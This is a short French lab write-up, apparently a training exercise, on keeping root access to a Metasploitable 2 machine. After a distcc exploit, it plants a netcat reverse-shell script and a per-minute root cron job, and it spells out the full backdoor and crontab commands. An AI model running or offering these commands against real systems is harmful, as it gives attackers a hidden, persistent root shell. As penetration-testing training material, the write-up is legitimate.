# Technique de Persistance sur Linux via Cron Job

Ce document détaille la mise en place d'une porte dérobée (backdoor) persistante sur un système Linux (Metasploitable 2) en utilisant une tâche planifiée (cron job).

## 🎯 Objectif

Assurer un accès `root` permanent à une machine compromise, même après un redémarrage du système.

## 🔬 Environnement du Laboratoire

-   **Machine Attaquante :** Kali Linux
-   **Machine Cible :** Metasploitable 2

## 👣 Méthodologie

### 1. Prise d'Accès Initial `root`
Un accès `root` initial a été obtenu en exploitant la vulnérabilité du service `distcc` avec Metasploit.

### 2. Création du Script de Backdoor
Un script de reverse shell simple a été créé directement sur la machine victime dans le répertoire `/root`.
-   **Commande :** `echo "nc [IP_KALI] 9999 -e /bin/bash" > /root/backdoor.sh`
-   Le script a ensuite été rendu exécutable avec `chmod +x`.

### 3. Mise en place de la Persistance
Une tâche planifiée a été ajoutée à la `crontab` de l'utilisateur `root` sans utiliser d'éditeur de texte (pour être compatible avec un shell non-interactif).
-   **Commande :** `echo "* * * * * /root/backdoor.sh" | crontab -`
-   **Vérification :** La commande `crontab -l` a confirmé la bonne installation de la tâche.

### 4. Test de Validation
-   Un écouteur Netcat a été lancé sur la machine Kali (`nc -lvnp 9999`).
-   La machine cible a été redémarrée (`reboot`).
-   **Résultat :** Dans la minute suivant le redémarrage, une connexion entrante a été reçue sur l'écouteur Netcat, fournissant un shell `root` immédiat. La persistance est fonctionnelle.

## 🧠 Compétences acquises
-   Compréhension et mise en place de techniques de persistance sur Linux.
-   Utilisation et manipulation des tâches planifiées (`cron jobs`).
-   Création de portes dérobées simples avec Netcat.
-   Gestion de la `crontab` via la ligne de commande pour les environnements limités.
